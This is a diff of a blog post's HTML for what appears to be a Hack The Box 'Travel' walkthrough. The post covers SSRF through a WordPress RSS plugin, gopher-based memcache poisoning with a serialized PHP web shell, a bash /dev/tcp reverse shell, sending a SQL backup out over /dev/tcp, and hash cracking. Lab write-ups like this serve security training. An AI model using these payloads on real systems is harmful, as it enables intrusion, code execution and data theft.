 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"> 	<span class="nv">$url</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;QUERY_STRING&#39;</span><span class="p">];</span>
@@ -1362,16 +1452,26 @@ Allows rss-feeds to be shown on a custom wordpress page.
 </span></span><span class="line"><span class="cl"> 	 	<span class="nv">$url</span> <span class="o">=</span> <span class="s2">&#34;http://www.travel.htb/newsfeed/customfeed.xml&#34;</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl"> 	 <span class="p">}</span>
 </span></span></code></pre></div><ul>
-<li>If the condition satisfies then it splits the URL with <code>'='</code> with <code>explode</code> like this <code>awesome-rss/?custom_feed_url=QUERY_STRING</code>. Else it will simply sets the <code>url</code> to <code>http://www.travel.htb/newsfeed/customfeed.xml</code></li>
-<li>So we can make the URL to look like this:</li>
+<li>If the condition satisfies then it splits the URL by <code>'='</code> with using <a href="https://www.w3schools.com/php/func_string_explode.asp" target="_blank">explode</a> function like this <code>awesome-rss/?custom_feed_url=QUERY_STRING</code>. Else it will simply sets the <code>url</code> to <code>http://www.travel.htb/newsfeed/customfeed.xml</code></li>
+<li>So let&rsquo;s test this by making the URL to look like this:</li>
 </ul>
 <pre tabindex="0"><code>http://blog.travel.htb/awesome-rss?custom_feed_url&amp;rss=http://10.10.14.16/rss
 </code></pre><ul>
-<li>Sent a curl request with this URL</li>
-<li>![[Pasted image 20250227224728.png]]</li>
-<li>Got a hit on my listener</li>
-<li>![[Pasted image 20250227224801.png]]</li>
-<li>At end of the source code we can see code for <code>debug</code> page. But It&rsquo;s within html comments</li>
+<li>I opened a netcat like this <code>nc -lnvp 3888</code> listener and sent a curl request with the above URL
+
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250227224728.png?raw=true" alt="Pasted image 20250227224728.png" />
+    
+  </figure>
+</li>
+<li>Got a hit on my listener, I can see it in the logs. This confirms the SSRF vulnerability here
+
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250227224801.png?raw=true" alt="Pasted image 20250227224801.png" />
+    
+  </figure>
+</li>
+<li>At end of the source code I can see a code for <code>debug</code> page. But It&rsquo;s within the html comments</li>
 </ul>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="c">&lt;!--
 </span></span></span><span class="line"><span class="cl"><span class="c">DEBUG
@@ -1382,25 +1482,45 @@ Allows rss-feeds to be shown on a custom wordpress page.
 </span></span></span><span class="line"><span class="cl"><span class="c">?&gt;
 </span></span></span><span class="line"><span class="cl"><span class="c">--&gt;</span>
 </span></span></code></pre></div><ul>
-<li>There wan&rsquo;t any difference in visiting <code>debug</code> it just returns the same page</li>
-<li>![[Pasted image 20250227225459.png]]</li>
-<li>But from the source code we can see. At first it was empty on refreshing it showed the cached value</li>
-<li>![[Pasted image 20250227225753.png]]</li>
-<li>We can do the same using curl</li>
+<li>There isn&rsquo;t any difference, on visiting <code>debug.php</code> it just returns the same page
+
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250227225459.png?raw=true" alt="Pasted image 20250227225459.png" />
+    
+  </figure>
+</li>
+<li>But from the source code I can see the contents. At first it was empty but on refreshing the page it showed me the cached value
+
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250227225753.png?raw=true" alt="Pasted image 20250227225753.png" />
+    
+  </figure>
+</li>
+<li>I can view the commented value using the <code>diff</code> command in my terminal</li>
 </ul>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">diff &lt;<span class="o">(</span>curl -s <span class="s1">&#39;http://blog.travel.htb/awesome-rss/?debug&#39;</span><span class="o">)</span> &lt;<span class="o">(</span>curl -s http://blog.travel.htb/awesome-rss/<span class="o">)</span>
 </span></span></code></pre></div><ul>
 <li>First try
 <ul>
-<li>![[Pasted image 20250227225907.png]]</li>
+<li>
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250227225907.png?raw=true" alt="Pasted image 20250227225907.png" />
+    
+  </figure>
+</li>
 </ul>
 </li>
 <li>Second try
 <ul>
-<li>![[Pasted image 20250227225941.png]]</li>
+<li>
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250227225941.png?raw=true" alt="Pasted image 20250227225941.png" />
+    
+  </figure>
+</li>
 </ul>
 </li>
-<li>This was the contents from <code>template.php</code></li>
+<li>This is the content from <code>template.php</code></li>
 </ul>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
 </span></span><span class="line"><span class="cl">
@@ -1462,7 +1582,7 @@ Allows rss-feeds to be shown on a custom wordpress page.
 </span></span><span class="line"><span class="cl">    <span class="p">}</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span></code></pre></div><ul>
-<li><code>template.php</code> mainly had the code for security mechanisms to <code>custom_feed_url</code></li>
+<li><code>template.php</code> primarily has the code for security mechanisms to secure <code>custom_feed_url</code></li>
 <li>The code mainly checks for:
 <ol>
 <li><code>file://</code> or  <code>@</code> &mdash;&gt; Local file Inclusion attacks</li>
@@ -1470,58 +1590,142 @@ Allows rss-feeds to be shown on a custom wordpress page.
 <li><code>localhost</code> or <code>127.0.0.1</code> &mdash;&gt; Server Side Request Forgery</li>
 </ol>
 </li>
-<li>If the above conditions satisfied then the PHP code exits and records attempts to <code>/logs/</code></li>
+<li>If the above conditions are satisfied then the PHP code exits and records attempts to <code>/logs/</code></li>
 <li>There is an workaround for this, I can use <a href="https://en.wikipedia.org/wiki/Gopher_%28protocol%29" target="_blank">Gopher</a> protocol instead of http with decimal representation of local host.</li>
-<li>Gopher is very old protocol used before http and delivers the message without any useless headers.</li>
-<li><strong>Testing:</strong>
+</ul>
+<p><span class="flex" style="cursor: pointer;">
+  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+     Definition 
+  </span>
+</span>
+
+Gopher is a protocol. It was designed for distributing, searching, and retrieving documents over the Internet. Gopher represented an early alternative to the World Wide Web.
+The gopher protocol has some things HTTP-based clients do not have. It is based on menus. An item selected from a menu will either open another menu, or a document.</p>
 <ul>
-<li>I can test gopher using this</li>
+<li>The bottom line is, Gopher is a very old protocol that used before http and delivers the message without any useless headers.</li>
 </ul>
+
+
+<h3 class="relative group">Testing with Gopher 
+    <div id="testing-with-gopher" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#testing-with-gopher" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<ul>
+<li>I can test gopher like this</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl -s <span class="s1">&#39;gopher://10.10.14.16:6001//testing&#39;</span>
+</span></span></code></pre></div><ul>
+<li>I can see that gopher successfully transfers the message without any Headers
+
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250228103856.png?raw=true" alt="Pasted image 20250228103856.png" />
+    
+  </figure>
 </li>
+<li>Now that I tested gopher for the <code>memcache</code> , I saved a local copy of <code>customfeed.xml</code> as <code>sec.xml</code>
+
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250228104112.png?raw=true" alt="Pasted image 20250228104112.png" />
+    
+  </figure>
+</li>
+<li>I opened a python http server and I requested for the file that I made, using SSRF that I discovered earlier</li>
 </ul>
-<pre tabindex="0"><code>curl -s &#39;gopher://10.10.14.16:6001//testing&#39;
-</code></pre><ul>
-<li>I can see that gopher successfully transfers the message without any headers</li>
-<li>![[Pasted image 20250228103856.png]]</li>
-<li>Now I tested for the <code>memcache</code> , I saved a local copy of <code>customfeed.xml</code> as <code>sec.xml</code></li>
-<li>![[Pasted image 20250228104112.png]]</li>
-<li>I requested this file using SSRF</li>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl -s http://blog.travel.htb/awesome-rss/<span class="se">\?</span><span class="nv">custom_feed_url</span><span class="o">=</span>http://10.10.14.16:8000/sec.xml
+</span></span></code></pre></div><ul>
+<li>Actually It saved the file that I made as some data into it&rsquo;s cache. Now I can see two data values
+
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250228104408.png?raw=true" alt="Pasted image 20250228104408.png" />
+    
+  </figure>
+</li>
+<li>This definitely could be a hash generated value.</li>
 </ul>
-<pre tabindex="0"><code>curl -s http://blog.travel.htb/awesome-rss/\?custom_feed_url=http://10.10.14.16:8000/sec.xml
-</code></pre><ul>
-<li>Actually It saved the file into it&rsquo;s caching. Now I can see two data</li>
-<li>![[Pasted image 20250228104408.png]]</li>
-<li>This definitely could be a hash generated.
-<strong>Poisoning Memcache:</strong></li>
-<li>Next I called for the local host using Gopher</li>
+
+
+<h3 class="relative group">Understanding Memcache 
+    <div id="understanding-memcache" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#understanding-memcache" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<ul>
+<li>Next I called for the local host using Gopher protocol</li>
 <li><a href="https://github.com/tarunkant/Gopherus" target="_blank">Gopherus</a> is a tool that generates SSRF payloads using gopher protocol.</li>
-<li>For the texting I gave <code>exploitEmp5r0R</code> as a payload value</li>
-<li>![[Pasted image 20250228105632.png]]</li>
-<li>Now I replace the localhost with it&rsquo;s decimal representation which is <code>2130706433</code> . Hex value is also applicable</li>
-<li>Now the payloads becomes</li>
+<li>For testing I gave <code>exploitEmp5r0R</code> as a payload value
+
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250228105632.png?raw=true" alt="Pasted image 20250228105632.png" />
+    
+  </figure>
+</li>
+<li>As I already know about the filters for <code>custom_feed_url</code> to bypass the them I can replace the localhost with it&rsquo;s decimal representation which is <code>2130706433</code> . Hex value is also applicable</li>
+<li>Now the payload becomes</li>
 </ul>
 <pre tabindex="0"><code>http://blog.travel.htb/awesome-rss/\?custom_feed_url=gopher://2130706433:11211/_%0d%0aset%20SpyD3r%204%200%2014%0d%0aexploitEmp5r0R%0d%0a
 </code></pre><ul>
 <li>Sent it using curl</li>
 </ul>
-<pre tabindex="0"><code>curl -s http://blog.travel.htb/awesome-rss/\?custom_feed_url=gopher://2130706433:11211/_%0d%0aset%20SpyD3r%204%200%2014%0d%0aexploitEmp5r0R%0d%0a
-</code></pre><ul>
-<li>![[Pasted image 20250228105938.png]]</li>
-<li>With <code>debug</code> I can see that it worked</li>
-<li>![[Pasted image 20250228110046.png]]</li>
-<li>As this is a MD5 generated we could also recreate it. This cache gets md5 hash for customfeed.xml as whole URL</li>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl -s http://blog.travel.htb/awesome-rss/<span class="se">\?</span><span class="nv">custom_feed_url</span><span class="o">=</span>gopher://2130706433:11211/_%0d%0aset%20SpyD3r%204%200%2014%0d%0aexploitEmp5r0R%0d%0a
+</span></span></code></pre></div><p>
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250228105938.png?raw=true" alt="Pasted image 20250228105938.png" />
+    
+  </figure>
+</p>
+<ul>
+<li>With <code>debug</code> I can see that it actually worked
+
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExNjVrYjEwM2p0NmV3bThudmZmbDNuejc4Mmt4czN1MGhydHo3MHMzbCZlcD12MV9naWZzX3NlYXJjaCZjdD1n/o75ajIFH0QnQC3nCeD/giphy.gif" alt="worked" />
+    
+  </figure>
+
+
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250228110046.png?raw=true" alt="Pasted image 20250228110046.png" />
+    
+  </figure>
+</li>
+<li>As this is a MD5 generated hash, I could also recreate it. This cache stores md5 hash of <code>customfeed.xml</code> with including the whole URL</li>
 </ul>
-<pre tabindex="0"><code>echo -n &#34;http://www.travel.htb/newsfeed/customfeed.xml&#34; | md5sum
-</code></pre><ul>
-<li>Like the above. Now the memcache get&rsquo;s another md5 sum for the output of above hash with key <code>spc</code>. I learnt about this while googling <code>memcache</code>. I could see the whole source code on the internet.</li>
-<li>![[Pasted image 20250228112509.png]]</li>
-<li>Now lets make another with the key <code>spc</code></li>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">echo</span> -n <span class="s2">&#34;http://www.travel.htb/newsfeed/customfeed.xml&#34;</span> <span class="p">|</span> md5sum
+</span></span></code></pre></div><ul>
+<li>The <code>Memcached</code> get&rsquo;s md5 sum of something with using the key <code>spc</code>. I learnt about this while googling <code>memcache</code>. I could see the whole source code on the internet as <code>memcache</code> is opensource.
+
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250228112509.png?raw=true" alt="Pasted image 20250228112509.png" />
+    
+  </figure>
+</li>
+<li>Now lets make another with the new found key <code>spc</code></li>
 </ul>
-<pre tabindex="0"><code>echo -n &#34;3903a76d1e6fef0d76e973a0561cbfc0:spc&#34; | md5sum
-</code></pre><ul>
-<li>![[Pasted image 20250228112555.png]]</li>
-<li>I can see the hash value matches to the value from debug</li>
-<li>![[Pasted image 20250228112654.png]]</li>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">echo</span> -n <span class="s2">&#34;3903a76d1e6fef0d76e973a0561cbfc0:spc&#34;</span> <span class="p">|</span> md5sum
+</span></span></code></pre></div><p>
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250228112555.png?raw=true" alt="Pasted image 20250228112555.png" />
+    
+  </figure>
+</p>
+<ul>
+<li>I can see this hash value matches to the value from debug
+
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250228112654.png?raw=true" alt="Pasted image 20250228112654.png" />
+    
+  </figure>
+</li>
 </ul>
 
 
@@ -1535,11 +1739,22 @@ Allows rss-feeds to be shown on a custom wordpress page.
     </span>        
     
 </h2>
-<p><strong>Creating Payload:</strong></p>
 <ul>
-<li>I can generate the serialized object by tweaking <code>template.php</code> code a little by injecting a payload</li>
+<li>I can generate the serialized object by tweaking <code>template.php</code> code a little by injecting a malicious payload</li>
 </ul>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+
+
+<h3 class="relative group">Crafting the payload 
+    <div id="crafting-the-payload" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#crafting-the-payload" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"> <span class="o">&lt;?</span><span class="nx">php</span>
 </span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">TemplateHelper</span>
 </span></span><span class="line"><span class="cl"><span class="p">{</span>
 </span></span><span class="line"><span class="cl"><span class="k">public</span> <span class="nv">$file</span><span class="p">;</span>
@@ -1559,17 +1774,32 @@ Allows rss-feeds to be shown on a custom wordpress page.
 </span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">serialize</span><span class="p">(</span><span class="nv">$pwn</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
 </span></span></span></code></pre></div><ul>
-<li>This code will generate a serialized object for the malicious payload which will be saved as <code>shell.php</code> within the <code>logs</code> folder.</li>
-<li>Actually running the php code locally we can see the process. But first let me create a directory called <code>logs</code></li>
+<li>This code will generate a serialized object for the malicious payload which on using will be saved as <code>shell.php</code> within the <code>logs</code> folder.</li>
+<li>Actually on running the php code locally I can watch the process. But first let me create a directory called <code>logs</code></li>
 </ul>
-<pre tabindex="0"><code>php exploit.php
-</code></pre><ul>
-<li>![[Pasted image 20250228114813.png]]</li>
-<li>I can see the payload too in my local system</li>
-<li>![[Pasted image 20250228114847.png]]</li>
-<li>Now I fed the payload generated by our script to <code>gopherus</code></li>
-<li>![[Pasted image 20250228114951.png]]</li>
-<li>This was the output I got while doing that</li>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">php</span> <span class="nx">exploit</span><span class="o">.</span><span class="nx">php</span>
+</span></span></code></pre></div><p>
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250228114813.png?raw=true" alt="Pasted image 20250228114813.png" />
+    
+  </figure>
+</p>
+<ul>
+<li>Now I can see the payload within the <code>logs</code> folder that I created
+
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250228114847.png?raw=true" alt="Pasted image 20250228114847.png" />
+    
+  </figure>
+</li>
+<li>Now I fed the serialized data generated by the php script to <code>gopherus</code>
+
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250228114951.png?raw=true" alt="Pasted image 20250228114951.png" />
+    
+  </figure>
+</li>
+<li>This was the output I got from <code>gopherus</code> tool</li>
 </ul>
 <pre tabindex="0"><code>gopher://127.0.0.1:11211/_%0d%0aset%20SpyD3r%204%200%20104%0d%0aO:14:%22TemplateHelper%22:2:%7Bs:4:%22file%22%3Bs:9:%22shell.php%22%3Bs:4:%22data%22%3Bs:32:%22%3C%3Fphp%20system%28%24_GET%5Bemperor%5D%29%3B%20%3F%3E%22%3B%7D%0d%0a
 </code></pre><ul>
@@ -1583,39 +1813,52 @@ Allows rss-feeds to be shown on a custom wordpress page.
 </ul>
 <pre tabindex="0"><code>http://blog.travel.htb/awesome-rss/\?custom_feed_url=gopher://2130706433:11211/_%0d%0aset%20xct_4e5612ba079c530a6b1f148c0b352241%204%200%20104%0d%0aO:14:%22TemplateHelper%22:2:%7Bs:4:%22file%22%3Bs:9:%22shell.php%22%3Bs:4:%22data%22%3Bs:32:%22%3C%3Fphp%20system%28%24_GET%5Bemperor%5D%29%3B%20%3F%3E%22%3B%7D%0d%0a
 </code></pre><ul>
-<li>Sent it using curl</li>
-<li>![[Pasted image 20250228115417.png]]</li>
-<li>Now If I got to <code>http://blog.travel.htb/wp-content/themes/twentytwenty/logs/shell.php?0=id</code> I can access the <code>shell.php</code></li>
-<li>Which worked very well</li>
-<li>![[Pasted image 20250228115554.png]]</li>
+<li>Sent it using curl
+
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250228115417.png?raw=true" alt="Pasted image 20250228115417.png" />
+    
+  </figure>
+</li>
+<li>On visiting <code>http://blog.travel.htb/wp-content/themes/twentytwenty/logs/shell.php?0=id</code> I could access <code>shell.php</code></li>
+<li>This worked very nicely
+
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250228115554.png?raw=true" alt="Pasted image 20250228115554.png" />
+    
+  </figure>
+</li>
 <li>To get a reverse shell lets change the <code>id</code> command with url encoded bash payload which would be</li>
 </ul>
-<pre tabindex="0"><code>bash%20%2Dc%20%27exec%20bash%20%2Di%20%26%3E%2Fdev%2Ftcp%2F10%2E10%2E14%2E16%2F6001%20%3C%261%27
-</code></pre><ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">bash%20%2Dc%20%27exec%20bash%20%2Di%20%26%3E%2Fdev%2Ftcp%2F10%2E10%2E14%2E16%2F6001%20%3C%261%27
+</span></span></code></pre></div><ul>
 <li>The final <strong>URL for reverse shell</strong> would be</li>
 </ul>
 <pre tabindex="0"><code>http://blog.travel.htb/wp-content/themes/twentytwenty/logs/shell.php?emperor=bash%20%2Dc%20%27exec%20bash%20%2Di%20%26%3E%2Fdev%2Ftcp%2F10%2E10%2E14%2E16%2F6001%20%3C%261%27
 </code></pre><ul>
-<li>I got the reverse shell</li>
+<li>I got the reverse shell connection on my listener</li>
 <li>I performed some <strong>shell up gradation</strong></li>
 </ul>
-<pre tabindex="0"><code>/usr/bin/script -qc /bin/bash /dev/null
-</code></pre><ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">/usr/bin/script -qc /bin/bash /dev/null
+</span></span></code></pre></div><ul>
 <li>Then for <code>clear</code> command</li>
 </ul>
-<pre tabindex="0"><code>export TERM=xterm
-</code></pre><ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
+</span></span></code></pre></div><ul>
 <li>Press <strong>CTRL+Z</strong></li>
 <li>Then after</li>
 </ul>
-<pre tabindex="0"><code>stty raw -echo; fg
-</code></pre><ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">stty raw -echo<span class="p">;</span> <span class="nb">fg</span>
+</span></span></code></pre></div><ul>
 <li>Atlast</li>
 </ul>
-<pre tabindex="0"><code>stty rows 38 columns 116
-</code></pre><ul>
-<li>![[Pasted image 20250228120138.png]]</li>
-</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">stty rows <span class="m">38</span> columns <span class="m">116</span>
+</span></span></code></pre></div><p>
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250228120138.png?raw=true" alt="Pasted image 20250228120138.png" />
+    
+  </figure>
+</p>
 
 
 <h2 class="relative group">Pivoting 
@@ -1629,19 +1872,47 @@ Allows rss-feeds to be shown on a custom wordpress page.
     
 </h2>
 <ul>
-<li>The directory <code>/opt/wordpress</code> has a <code>sql</code> database file</li>
-<li>So transferred the file using this</li>
+<li>While enumerating I found the directory <code>/opt/wordpress</code> which had a <code>sql</code> database file</li>
+<li>So I transferred the file like this to my netcat listener</li>
 </ul>
-<pre tabindex="0"><code>cat backup-13-04-2020.sql &gt; /dev/tcp/10.10.14.16/8001
-</code></pre><ul>
-<li>If I search for <code>admin</code> using <code>grep</code> I can get two hashes</li>
-<li>![[Pasted image 20250228121321.png]]</li>
-<li>Only one hash could be cracked. Hash for  user <code>lynik-admin</code> can be cracked</li>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">cat backup-13-04-2020.sql &gt; /dev/tcp/10.10.14.16/8001
+</span></span></code></pre></div><ul>
+<li>If I search for <code>admin</code> using <code>grep</code> I can get two hashes
+
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250228121321.png?raw=true" alt="Pasted image 20250228121321.png" />
+    
+  </figure>
+</li>
+<li>Only one hash could be cracked. Which is the hash for user <code>lynik-admin</code></li>
 </ul>
-<pre tabindex="0"><code>hashcat hashes /usr/share/wordlists/rockyou.txt
-</code></pre><ul>
-<li>![[Pasted image 20250228121920.png]]</li>
-<li>We have ssh access for user <code>lynik-admin</code></li>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">hashcat hashes /usr/share/wordlists/rockyou.txt
+</span></span></code></pre></div><p>
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250228121920.png?raw=true" alt="Pasted image 20250228121920.png" />
+    
+  </figure>
+</p>
+<ul>
+<li>Now I have ssh access for user <code>lynik-admin</code></li>
+<li>Got the 
+<div class="flex mt-2">
+<span
+  class="rounded-full bg-primary-500 dark:bg-primary-400 text-neutral-50 dark:text-neutral-800 px-1.5 py-[1px] text-xs font-normal"
+>
+  <span class="flex flex-row items-center">
+    
+    <span>User flag</span>
+  </span>
+</span>
+</div></li>
+<li><em>Breaking the fourthwall</em> &ndash;&gt; I can see what you are thinking
+
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://media1.tenor.com/m/--JqR4L6UIIAAAAC/titanic-it%27ll-all-be-over-soon.gif" alt="soon" />
+    
+  </figure>
+</li>
 </ul>
 
 
@@ -1656,20 +1927,42 @@ Allows rss-feeds to be shown on a custom wordpress page.
     
 </h2>
 <ul>
-<li>In the home directory of <code>lynik-admin</code> , I can see a hidden file <code>.ldaprc</code>.</li>
-<li>![[Pasted image 20250228163300.png]]</li>
-<li>Which is particularly interesting, This <a href="https://www.mkssoftware.com/docs/man5/ldap_config.5.asp" target="_blank">article</a> says that the file <code>ldaprc</code> holds the configuration for <code>LDAP</code> clients.</li>
-<li>![[Pasted image 20250228163610.png]]</li>
-<li>The file contents are:-
-<ul>
-<li>![[Pasted image 20250228163642.png]]</li>
-</ul>
+<li>In the home directory of <code>lynik-admin</code> , I can see a hidden file <code>.ldaprc</code>.
+
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250228163300.png?raw=true" alt="Pasted image 20250228163300.png" />
+    
+  </figure>
 </li>
-<li>I enumerated the domain with some basic commands</li>
-<li>![[Pasted image 20250228163936.png]]</li>
+<li>Which is particularly interesting, This <a href="https://www.mkssoftware.com/docs/man5/ldap_config.5.asp" target="_blank">article</a> says that the file <code>ldaprc</code> holds the configuration for <code>LDAP</code> clients.
+
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250228163610.png?raw=true" alt="Pasted image 20250228163610.png" />
+    
+  </figure>
+</li>
+<li>The file contents are:-
+
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250228163642.png?raw=true" alt="Pasted image 20250228163642.png" />
+    
+  </figure>
+</li>
+<li>I enumerated the domain with some basic commands
+
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250228163936.png?raw=true" alt="Pasted image 20250228163936.png" />
+    
+  </figure>
+</li>
 <li>There was another interesting file hidden within the home directory which is <code>.viminfo</code></li>
-<li>Basically <code>.viminfo</code> file will hold serialized data of modification done through vim editor.</li>
-<li>![[Pasted image 20250228164514.png]]</li>
+<li>Basically <code>.viminfo</code> file will hold serialized data of any modifications done through vim editor.
+
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250228164514.png?raw=true" alt="Pasted image 20250228164514.png" />
+    
+  </figure>
+</li>
 <li>Contents of <code>.viminfo</code>:</li>
 </ul>
 <pre tabindex="0"><code># This viminfo file was generated by Vim 8.1.
@@ -1720,21 +2013,26 @@ Allows rss-feeds to be shown on a custom wordpress page.
 	+	4	0
 </code></pre><ul>
 <li>There was a word which looked like a password so I redacted that particular data and gave you the contents</li>
-<li>Usually the #LDAP listens on port 389. We can do a quick bash scan to confirm it</li>
+<li>Usually the LDAP listens on port 389. We can do a quick bash scan to confirm that</li>
 </ul>
-<pre tabindex="0"><code>for port in {1..65535}; do echo &gt; /dev/tcp/172.20.0.10/$port &amp;&amp; echo &#34;$port open&#34;; done 2&gt;/dev/null
-</code></pre><ul>
